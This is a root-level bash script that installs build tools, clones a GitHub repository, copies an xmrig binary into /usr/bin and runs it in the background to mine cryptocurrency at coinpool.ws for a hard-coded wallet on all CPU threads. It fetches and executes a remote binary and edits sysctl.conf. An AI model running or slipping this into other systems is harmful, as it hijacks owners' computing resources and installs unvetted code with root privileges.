#! /bin/bash
if [ "$(whoami)" != "root" ]; then
        echo -e "\033[0;31mSorry, you are not root. Please use sudo option\033[0m"
        exit 1
fi

WALLET=0x6da460fd56b991e3c7e75963aa3a7a7646e1c730
ID="$(hostname)"
PASSWORD=x
THREADS="$(nproc --all)"

echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
	sudo sysctl -p
echo -e '\033[0;32m##### Installing updates and install soft...\033[0m'
	sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc -y
sleep 2
	rm -rf /tmp/miner
cd /tmp && mkdir miner
	git clone https://github.com/loaman123/miner-xmr.git /tmp/miner
cd /tmp/miner
	chmod +x /tmp/miner/xmrig
sleep 1
	cp /tmp/miner/xmrig /usr/bin/
sleep 1
	xmrig -o coinpool.ws:5555 -u $WALLET --pass=$PASSWORD --threads=$THREADS -B -l /tmp/miner/coinpool_qrl.log --donate-level=1 --print-time=10 --variant 1 -k 
echo -e '\033[0;32m##### Miner started \033[0m'
echo -e '\033[0;32m##### Watch: \033[0m'
echo -e '\033[0;32m##### tail -f /tmp/miner/xmrig.log \033[0m'
